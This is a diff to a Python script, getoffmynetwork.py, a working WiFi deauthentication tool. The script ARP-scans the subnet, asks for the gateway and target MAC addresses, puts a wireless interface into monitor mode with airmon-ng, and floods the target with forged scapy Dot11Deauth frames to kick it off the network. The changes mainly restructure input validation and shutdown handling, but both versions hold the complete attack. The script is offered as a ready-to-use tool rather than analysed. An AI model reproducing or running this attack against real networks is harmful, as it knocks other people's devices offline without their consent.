@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # getoffmynetwork.py 
 # author = Jesse
-# date = 9/28/2018
+# date = 10/2/2018
 
 
 # try to import the needed modules
@@ -10,13 +10,15 @@ try:
 	from termcolor import colored
 	import subprocess
 	import os
+	import time
 	import sys
 	import urllib2
+	import platform
 
 # handling ImportError
 except ImportError:
 	# cannot print colored text because user might not have module for this installed		
-	print('requirements arent properly statisfied!')
+	print('requirements arent properly statisfied! (check README for installation)')
 	sys.exit()
 
 except KeyboardInterrupt:
@@ -41,18 +43,51 @@ local_ip = subprocess.check_output('ifconfig | grep inet', shell=True)
 
 
 
-
-
 # functions starting here
 
+def exit():
+	try:
+		# requested shutdown :(
+		print(colored('\n\n[-]', 'red')),
+		print('requested shutdown\n')
+
+		time.sleep(1)
+
+		# checks if iface is in monitor mode
+		# checks if the script went until the assignment of the mon variable,
+		# if it did, your iface should be set into monitor mode
+		if monInterface[-3:] == 'mon':
+			print(colored('[*]', 'red')),
+			print('stopping monitor mode on ' + monInterface + '\n')
+			# stopping monitor mode on iface
+			stop_mon_mode = subprocess.check_output('airmon-ng stop ' + monInterface, shell=True)
+
+			# hide the stop_mon_mode output to keep the shell clean			
+			print(stop_mon_mode[0:0])
+			
+
+			time.sleep(0.5)
+				
+			print(colored('[*]', 'red')),
+			print('done!')
+			# exit this script
+			sys.exit()
+
+	# a NameError would occur if you exit before you assign all variables, this hides this error
+	except NameError:
+		sys.exit()
+
+	
 
 # function that checks if the user has an internet connection
 def check_connection():
+
 	try:
 		# open google.com
-	        response=urllib2.urlopen('https://www.google.com/')
+	    response=urllib2.urlopen('https://www.google.com/')
+
 	# if an error occurs, quit
-	except urllib2.URLError as err:
+	except urllib2.URLError:
 		# still display the logo even if the user doesnt have a internet connection
 		# clearing the screen
 		subprocess.call('clear',shell=True)
@@ -78,22 +113,26 @@ def check_connection():
 	
 		# exiting
 		sys.exit()
+	
 
 check_connection()
 
 
+
 # check if user is root
-def checkRoot():
+def check_root():
 	# userid of root is always 0
 	if os.geteuid() != 0:
 		print('getofmynetwork.py needs root priveleges to run, please try again with sudo')
 		sys.exit()
 	
-checkRoot()
+check_root()
 
 
 
-def getofmynetwork():
+
+def heading():
+
 		try:
 			# clearing the screen
 			subprocess.call('clear',shell=True)
@@ -104,309 +143,340 @@ def getofmynetwork():
 			print(colored(figlet, 'red'))
 			print('==============================================================================================================')
 			
+
+		except KeyboardInterrupt:
+			exit()
+
+
+
+
+def arp_ping():	
+		
+	try:
+
+		while True:
 			print(colored('\n[*]', 'red')),
 			# ask for local subnet
 			askSubnet = raw_input('enter your local subnet for the ARP ping(e.g. 192.168.0.0/16): ')
 			# a subnet always contains a /
+			# or user just wants to scan a single host but thats probably not the case
 			if not '/' in askSubnet:
 				print(colored('[!]', 'red')),
-				askSubnet2 = raw_input('thats not a valid subnet, r to enter again, [enter] if you just want to ping a single host): ')
-				if askSubnet2 == 'r':
-					print(colored('[*]', 'red')),
-					# overwrite the variable
-					askSubnet = raw_input('enter your local subnet for the ARP ping(i.e. 192.168.0.0/16): ')
-
-				elif askSubnet2 == 'R':
-					print(colored('[*]', 'red')),
-					# overwrite the variable
-					askSubnet = raw_input('enter your local subnet for the ARP ping(i.e. 192.168.0.0/16): ')
-
-	
-					
-			# minimum length of a subnet is something like 11 ^^
-			if len(askSubnet) < 11:
-				# the comma is used to print both print statements on the same line
-				print(colored('[!]', 'red')),
-				# you might have entered that wrong ;)
-				askSubnet2 = raw_input('are you sure you entered that right?(r to enter again): ')
-
-				time.sleep(1)
-
-				if askSubnet2 == 'r':
-					print(colored('[*]', 'red')),
-					# overwrite the variable
-					askSubnet = raw_input('enter your local subnet for the ARP ping(i.e. 192.168.0.0/16): ')
-			
-				elif askSubnet2 == 'R':
-					print(colored('[*]', 'red')),
-					# overwrite the variable
-					askSubnet = raw_input('enter your local subnet for the ARP ping(i.e. 192.168.0.0/16): ')
-			
-			time.sleep(1)
-			
-
-			print(colored('\n[*]', 'red')),
-			# letting the user know the arp ping is running
-			print('ARP ping is running...\n')
-		
-			
-			# performing the arp ping on the whole subnet with scapy			
-			arp_ping = ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=askSubnet),timeout=2)
-			# displaying the arp ping output on the screen(IP and MACaddr)
-			arp_ping_output = ans.summary(lambda (s,r): r.sprintf('%ARP.psrc% has %Ether.src%') )
-		
-			# not all at once!
-			time.sleep(1)
-			
-			print(colored('[!]', 'red')),		
-			# prints the users default gateway	
-			print('your default gateway is at ' + router_ip[12:26])
-
-			print(colored('[!]', 'red')),
-			# prints users local ip
-			print('you are at' + local_ip[12:26])
-
-			time.sleep(1)
-			
-			print(colored('\n[*]', 'red')),
-			# ask interface
-			interface = raw_input('enter interface: ')
-
-			# if 'eth' is in the input from user
-			if 'eth' in interface:
-				print(colored('[-]', 'red')),
-				print('wired network interfaces cannot be put in monitor mode, you need a wireless interface')
-				print(colored('[-]', 'red')),
-				print('exiting...')
-				# exiting
-				sys.exit()
-
-			# sleep for 1 second for the looks
-			time.sleep(1)
-
-	
-		
-
-			
-			# < 3 character interface name?
-			if len(interface) < 3:
-				# we all misspell sometimes :)
-				print(colored('\n[!]', 'red')),
-				interface2 = raw_input('are you sure you entered that right?(r to enter again): ')
+				print('please enter a valid subnet')
 				
-				time.sleep(1)
-				
-				if interface2 == 'r':
-					print(colored('[*]', 'red')),
-					interface = raw_input('enter interface: ')
-				
-				elif interface2 == 'R':
-					print(colored('[*]', 'red')),
-					interface = raw_input('enter interface: ')
-			
-			time.sleep(1)
-			
-			# make sure the user enters the non-monitor mode interface name to prevent later errors
-			if interface[-3:] == 'mon':
-				print(colored('[!]', 'red')),
-				interface2 = raw_input('you have to enter non-monitor mode interface name(r to enter again): ')
-				if interface2 == 'r':
-					print(colored('[*]', 'red')),
-					interface = raw_input('enter interface: ')
-				elif interface2 == 'R':
-					print(colored('[*]', 'red')),
-					interface = raw_input('enter interface: ')
-
-
-				
-			print(colored('[*]', 'red')),	
-			# asking routers mac	
-			router_mac = raw_input('enter default gateway mac: ')
-			if not ':' in router_mac:
-				print(colored('[!]', 'red')),
-				router_mac2 = raw_input('please enter a valid mac address(r to enter again): ')
-				if router_mac2 == 'r':
-					print(colored('[*]', 'red')),
-					router_mac = raw_input('enter default gateway mac: ')
-	
-				elif router_mac2 == 'R':
-					print(colored('[*]', 'red')),
-					router_mac = raw_input('enter default gateway mac: ')
-
-			
-			# mac addresses are always 17 characters long
-			if len(router_mac) != 17:
-				print(colored('\n[!]', 'red')),
-				router_mac2 = raw_input('are you sure you entered that right?(r to enter again) ')
-
-				time.sleep(1)
-				
-				if router_mac2 == 'r':
-					print(colored('[*]', 'red')),
-					router_mac = raw_input('enter default gateway mac: ')
-
-				elif router_mac2 == 'R':
-					print(colored('[*]', 'red')),
-					router_mac = raw_input('enter default gateway mac: ')
-			
-			time.sleep(1)
-
-
-
-			print(colored('[*]', 'red')),			
-			target_mac = raw_input('enter targets mac: ')
-			
-			# mac addresses are always 17 characters long
-			if len(target_mac) != 17:
-				print(colored('\n[!]', 'red')),
-				target_mac2 = raw_input('are you sure you entered that right?(r to enter again) ')
-			
-				time.sleep(1)
-
-				if target_mac2 == 'r':
-					print(colored('[*]', 'red')),
-					target_mac = raw_input('enter targets mac: ')
-				elif target_mac2 == 'R':
-					print(colored('[*]', 'red')),
-					target_mac = raw_input('enter targets mac: ')
-
-			time.sleep(1)
-
-
-			# if target mac does not contain at least one ':' 
-			if not ':' in target_mac:
-				print(colored('[!]', 'red')),
-				target_mac2 = raw_input('please enter a valid mac address(r to enter again): ')
-				if target_mac2 == 'r':
-					print(colored('[*]', 'red')),
-					# let the user asign the target_mac variable again
-					target_mac = raw_input('enter targets mac: ')
-	
-				elif router_mac2 == 'R':
-					print(colored('[*]', 'red')),
-					# let the user asign the target_mac variable again
-					router_mac = raw_input('enter default gateway mac: ')
-
-			time.sleep(1)
-
-
-			# starting monitor mode
-
-			print(colored('\n[*]', 'red')),
-			# letting the user know what is going on
-			print('setting monitor mode up on ' + interface)
-			
-			# putting interface into monitor mode
-			start_mon_mode = subprocess.check_output('airmon-ng start ' + interface, shell=True)
-			# output should be longer than 30 characters
-			if len(start_mon_mode) < 30:
-				print(colored('[!]', 'red'))
-				print('an error occured when setting monitor mode up on ' + interface)
-				sys.exit()
-				
-			# hide the start_mon_mode output to keep the shell clean
-			print(start_mon_mode[0:0])
-			print(colored('[+]', 'red')),
-			print('monitor mode on ' + interface + ' has been set up!')
-				
-			time.sleep(1.5)
-			
-			# interface name when in monitor mode
-			monInterface = interface+'mon'
-
-			
-			#  deauthentication part
-			
-			# asking amount of deauth packets
-			print(colored('[*]', 'red')),
-			amount = raw_input('enter the amount of deauthentication packets you want to send(100-150 is recommended): ')
-			# send some more!
-			if len(amount) < 2:
-				print(colored('[!]', 'red')),
-				amount2 = raw_input('you have to send at least 10 deauthentication packets(r to enter again): ')
-				if amount2 == 'r':
-					print(colored('[*]', 'red')),
-					amount = raw_input('enter the amount of deauthentication packets you want to send(100-150 is recommended): ')
-				elif amount2 == 'R':
-					print(colored('[*]', 'red')),
-					amount = raw_input('enter the amount of deauthentication packets you want to send(100-150 is recommended): ')
-				 		
-			
-			# defining some more variables that are needed to excecute the deauthentication attack
-			conf.iface = interface+'mon'
-			conf.verb = 0
-	
-			# the deauthentication crafted with scapy
-			packet = RadioTap()/Dot11(type=0,subtype=12,addr1=target_mac,addr2=router_mac,addr3=router_mac)/Dot11Deauth(reason=7)
-			# for loop for sending deauth packets
-			for n in range(int(amount)):
-				
-				# used in the for loop for sending the deauthentication packets
-				packet_num = 0
-				# sending the packet
-				sendp(packet)
-				print(colored('[+]', 'red')),
-				print('packets are being sent to ' + target_mac)
-
-			# done!
-			print(colored('[+]', 'red')),
-			print('done sending packets!')
-
-			time.sleep(1)
-
-			# checks if interface is in monitor mode
-			# check if the script went until the assignment of the monInterface variable,
-			# if it did, your interface should be set into monitor mode
-			if monInterface[-3:] == 'mon':
-				print(colored('[*]', 'red')),
-				print('stopping monitor mode on ' + monInterface + '\n')
-				# stopping monitor mode on interface
-				stop_mon_mode = subprocess.check_output('airmon-ng stop ' + monInterface, shell=True)
-	
-				# hide the stop_mon_mode output to keep the shell clean			
-				print(stop_mon_mode[0:0])
-				
-				time.sleep(1)
-				
-				print(colored('[+]', 'red')),
-				print('done')
-			
-		
-		# handling Ctrl + C
-		except KeyboardInterrupt:
-			# requested shutdown :(
-			print(colored('\n\n[-]', 'red')),
-			print('requested shutdown\n')
-
-			time.sleep(1)
-
-			# checks if interface is in monitor mode
-			# checks if the script went until the assignment of the mon variable,
-			# if it did, your interface should be set into monitor mode
-			if monInterface[-3:] == 'mon':
-				print(colored('[*]', 'red')),
-				print('stopping monitor mode on ' + monInterface + '\n')
-				# stopping monitor mode on interface
-				stop_mon_mode = subprocess.check_output('airmon-ng stop ' + monInterface, shell=True)
-	
-				# hide the stop_mon_mode output to keep the shell clean			
-				print(stop_mon_mode[0:0])
-		
-
 				time.sleep(0.5)
+
+				# keep printing until a valid subnet is entered
+				continue
+
+						
+			# minimum length of a subnet is something like 10 ^^
+			if len(askSubnet) < 10:
+				print(colored('[!]', 'red')),
+				print('please enter a valid subnet')
+				
+				time.sleep(0.5)
+
+				# keep printing until a valid subnet is entered
+				continue
+
+			if len(askSubnet) > 15:
+				print(colored('[!]', 'red')),
+				print('please enter a valid subnet')
+				
+				time.sleep(0.5)
+
+				# keep printing until a valid subnet is entered
+				continue
+
+			else:
+
+				print(colored('\n[*]', 'red')),
+				# letting the user know the arp ping is running
+				print('ARP ping is running...\n')
+					
+				# performing the arp ping on the whole subnet with scapy			
+				arp_ping = ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=askSubnet),timeout=2)
+
+				# displaying the arp ping output on the screen(IP and MACaddr)
+				arp_ping_output = ans.summary(lambda (s,r): r.sprintf('%ARP.psrc% has %Ether.src%') )
+
+				# not all at once!
+				time.sleep(1)
+							
+				print(colored('[!]', 'red')),		
+				# prints the users default gateway	
+				print('your default gateway is at ' + router_ip[12:26])
+
+				print(colored('[!]', 'red')),
+				# prints users local ip
+				print('you are at' + local_ip[12:26])
+
+				time.sleep(1)
+
+				# breaking the loop
+				break
+
+				
 			
-				print(colored('[*]', 'red')),
-				print('done!')
+			
+	except KeyboardInterrupt:
+		exit()
 
 
 
+def getofmynetwork():
+
+	try:
+		# this might not be the best way to do it but it works so...
+		while True:
+					
+			print(colored('\n[*]', 'red')),
+			# ask iface
+			iface = raw_input('enter interface: ')
+
+
+			# < 3 character interface name?
+			if len(iface) < 3:
+				print(colored('[!]', 'red')),
+				print('please enter a valid interface')
+					
+				time.sleep(0.5)
+
+				# keep printing until a valid interface name is entered
+				continue
+				
+			
+				
+			time.sleep(1)
+
+			# eth0 might not support monitor mode
+			if 'eth' in iface:
+				# sleep for a short time
+				time.sleep(0.3)
+				print(colored('[!]', 'red')),
+				print('make sure your interface can be put into monitor mode and supports packet injection!')
+
+				
+			# make sure the user enters the non-monitor mode iface name to prevent later errors
+			if iface[-3:] == 'mon':
+				print(colored('[!]', 'red')),
+				print('you have to enter the non-monitor mode iface name')
+		
+				time.sleep(0.5)
+
+				# keep printing until a valid iface name is entered
+				continue
+
+			# then the input is valid so this part is done
+			else:
+
+				# starting a new while loop inside the other while loop so the variables are defined in the other while loops
+				while True:
+					# sleep for the looks
+					time.sleep(0.5)
+
+					print(colored('\n[*]', 'red')),	
+					# asking routers mac	
+					router_mac = raw_input('enter default gateway mac: ')
+					# if there isnt a ':' in the users input
+					if not ':' in router_mac:
+						print(colored('[!]', 'red')),
+						print('please enter a valid mac address')
+				
+						time.sleep(0.5)
+					
+						# keep going until a valid mac address has been entered
+						continue
+
+						
+					# mac addresses are always 17 characters long
+					if len(router_mac) != 17:
+						print(colored('[!]', 'red')),
+						print('please enter a valid mac address')
+					
+						time.sleep(0.5)
+
+						# keep going until a valid mac address has been entered
+						continue
+						
+
+					# then the input is valid so we can break the loop and move on
+					else:
+						
+						# another while loop...
+						while True:
+
+
+							# sleep before asking
+							time.sleep(1)
+
+							print(colored('\n[*]', 'red')),			
+							target_mac = raw_input('enter targets mac: ')
+							
+							# mac addresses are always 17 characters long
+							if len(target_mac) != 17:
+								print(colored('[!]', 'red')),
+								print('please enter a valid mac address')
+								
+								time.sleep(0.5)
+
+								# keep going until a valid mac address has been entered
+								continue 
+
+
+							time.sleep(1)
+
+
+							# if target mac does not contain at least one ':' 
+							if not ':' in target_mac:
+								print(colored('[!]', 'red')),
+								print('please enter a valid mac address')
+						
+								time.sleep(0.5)
+
+								# keep going until a valid mac address has been entered
+								continue
+							
+							# then the input is valid so we can go on 
+							else:
+						
+								# and another one
+								while True:
+
+									# asking amount of deauth packets
+									print(colored('\n[*]', 'red')),
+									amount = raw_input('enter the amount of deauthentication packets you want to send(100-150 is recommended): ')
+									# if users input is not a number/digit
+									if not amount.isdigit():
+										print(colored('[!]', 'red')),
+										print('the amount has to be a number!')
+								
+										time.sleep(0.5)
+										
+										# keep going until input is valid
+										continue
+
+									if len(amount) < 2:
+										print(colored('[!]', 'red')),
+										print('you have to send at least 10 packets!')
+
+										time.sleep(0.5)
+
+										# keep printing the above until input is valid
+										continue 
+		
+								
+									
+									# then the input is valid so we can continue to the next part
+									else:
+									
+
+										# starting monitor mode
+
+										print(colored('\n[*]', 'red')),
+										# letting the user know what is going on
+										print('setting monitor mode up on ' + iface)
+										
+										# putting iface into monitor mode
+										start_mon_mode = subprocess.check_output('airmon-ng start ' + iface, shell=True)
+										# output should be longer than 30 characters
+										if len(start_mon_mode) < 30:
+											print(colored('[!]', 'red'))
+											print('an error occured when setting monitor mode up on ' + iface)
+											sys.exit()
+											
+					
+										time.sleep(1)
+
+									
+										# hide the start_mon_mode output to keep the shell clean
+										print(start_mon_mode[0:0])
+									
+									
+										# hide the start_mon_mode output to keep the shell clean
+										print(start_mon_mode[0:0])
+										print(colored('[+]', 'red')),
+										print('monitor mode on ' + iface + ' has been set up!')
+
+										
+
+											
+										# iface name when in monitor mode
+										monInterface = iface+'mon'
+										
+										time.sleep(1)
+							
+										# defining some more variables that are needed to excecute the deauthentication attack
+										conf.iface = iface+'mon'
+										conf.verb = 0
+												
+
+
+
+										# the deauthentication packet crafted with scapy
+										packet = RadioTap()/Dot11(type=0,subtype=12,addr1=target_mac,addr2=router_mac,addr3=router_mac)/Dot11Deauth(reason=7)
+
+
+
+										# for loop for sending deauth packets
+										for n in range(int(amount)):
+
+											# sending the packet
+											sendp(packet)
+											print(colored('[+]', 'red')),
+											print('packets are being sent to ' + target_mac)
+
+										time.sleep(0.5)
+
+										# out of the for loop so it will only be printed once
+										print(colored('\n[+]', 'red')),
+										print('done sending ' + amount + ' packets!')
+										print(colored('\n[+]', 'red')),
+										print('the host has now been kicked of the network!')
+
+										time.sleep(0.5)
+
+										# checks if interface is in monitor mode
+										# check if the script went until the assignment of the monInterface variable,
+										# it probably did but its never a bad idea to still check
+										if monInterface[-3:] == 'mon':
+											print(colored('\n[*]', 'red')),
+											print('stopping monitor mode on ' + monInterface)
+											# stopping monitor mode on interface
+											stop_mon_mode = subprocess.check_output('airmon-ng stop ' + monInterface, shell=True)
+									
+											# hide the stop_mon_mode output to keep the shell clean			
+											print(stop_mon_mode[0:0])
+												
+											time.sleep(1)
+												
+											print(colored('[+]', 'red')),
+											print('done!\n')
+							
+											# dont forget to break the loop if the user makes it until the end!
+											break
+
+
+
+	# Ctrl + C
+	except KeyboardInterrupt:
+		exit()	
+
+
+
+	# exception for IOErrors
+	except IOError:
+		print(colored('\n[-]', 'red')),
+		print('interface does not support monitor mode or is not available')
+		print(colored('[-]', 'red')),
+		print('exiting...')
+		sys.exit()
+
+		
+									
+
+# calling the created functions			
+heading()
+arp_ping()
 getofmynetwork()
-
-# if anything goes wrong and python exits the function monitor mode will still be stopped
-# if monitor mode has already been stopped this wont harm your network interface
-
-# stopping monitor mode on interface
-stop_mon_mode = subprocess.check_output('airmon-ng stop ' + monInterface, shell=True)
-	
-# hide the stop_mon_mode output to keep the shell clean			
-print(stop_mon_mode[0:0])
